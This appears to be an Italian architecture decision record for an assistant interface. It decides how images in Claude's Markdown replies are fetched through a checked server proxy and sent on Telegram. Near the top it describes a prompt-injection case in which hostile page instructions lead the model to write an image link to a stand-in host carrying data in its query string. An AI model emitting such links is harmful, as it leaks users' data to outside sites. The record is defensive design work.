---
status: accepted
---

# Immagini nel testo delle risposte

Fino a qui un'immagine scritta da Claude nel testo, in Markdown, non si caricava: al suo posto compariva il suo nome. Un indirizzo di immagine scritto dal modello si carica da solo, appena la risposta si apre, e può portare dati a chi lo riceve: una pagina con istruzioni ostili potrebbe far scrivere a Claude `![](https://altro.sito/?dati=…)`. Per vedere una foto restava l'elaborato a parte. Il 22 novembre 2026 il proprietario ha chiesto risposte come quelle di ChatGPT: in una lista di luoghi, per ogni voce la foto a sinistra e il testo accanto.

## Decisioni

- **Le immagini le passa il centro.** Il browser non chiede mai un'immagine a un altro sito: la chiede al centro (`/api/immagine-esterna`), che la scarica e gliela passa. Il sito non vede l'indirizzo del proprietario, il suo browser né i suoi cookie, e la politica dei contenuti dell'interfaccia resta `img-src 'self' data:`. L'immagine arriva con una politica che non lascia girare nulla e con `nosniff`.
- **Da qualunque sito https, per scelta del proprietario.** Tra un elenco di siti fidati, un tocco per caricare le altre e nessun limite, ha scelto nessun limite, sapendo che un indirizzo scritto da Claude porta a quel sito i dati che contiene. Le immagini restano comunque fuori dall'interfaccia finché il centro non le ha controllate.
- **Le regole del centro.** Solo https sulla porta 443, senza nome utente e password nell'indirizzo; mai un indirizzo della rete di casa, del server o riservato: ogni nome si risolve nel momento del collegamento, così un nome che cambia indirizzo tra il controllo e la richiesta non passa, e i reindirizzamenti, al massimo quattro, si ricontrollano. Passa solo un'immagine vera, riconosciuta dai primi byte (JPEG, PNG, GIF, WebP, AVIF): niente SVG, che è un documento e può portare uno script. Al massimo 8 MB e quindici secondi. Il centro si presenta con un nome generico, che non dice nulla del proprietario.
- **Una volta sola.** Ciò che il centro scarica resta un giorno in memoria, fino a 64 MB, e un rifiuto dieci minuti: la stessa risposta riletta, nel browser e su Telegram, non richiede le immagini al sito ogni volta.
- **Schede.** Un paragrafo o una voce di elenco che comincia con un'immagine e continua con del testo diventa una scheda: la foto piccola a sinistra, il testo in una colonna accanto. Uno fatto solo di immagini le mostra grandi. Un'immagine che non si carica non si vede, e il testo resta. Un tocco apre la foto a tutto schermo. Vale ovunque Shinka mostri un testo in Markdown: le risposte, i file dei progetti, le skill.
- **Su Telegram, dopo il testo.** Il testo arriva senza le immagini; subito dopo, ognuna come foto con il suo nome per didascalia, al massimo dieci, scaricate dal centro con le stesse regole e mandate dal gateway come un file qualunque. Una che non si scarica resta fuori, senza avvisi. Il gateway non cambia.
- **Claude lo sa.** Le istruzioni della Home dicono come scriverle, di non inventare gli indirizzi, e che da Wikimedia Commons basta il nome del file (`Special:FilePath/<nome>?width=640`), che porta all'immagine in una misura adatta.

## Consequences

- Il centro fa richieste verso siti scelti da ciò che Claude scrive: è il rischio accettato dal proprietario. Le richieste non portano nulla di suo, e la rete di casa resta fuori.
- Un indirizzo inventato da Claude dà un'immagine che non si vede: la risposta resta leggibile.
- I progetti mostrano le immagini come la Home, ma le loro istruzioni non ne parlano.
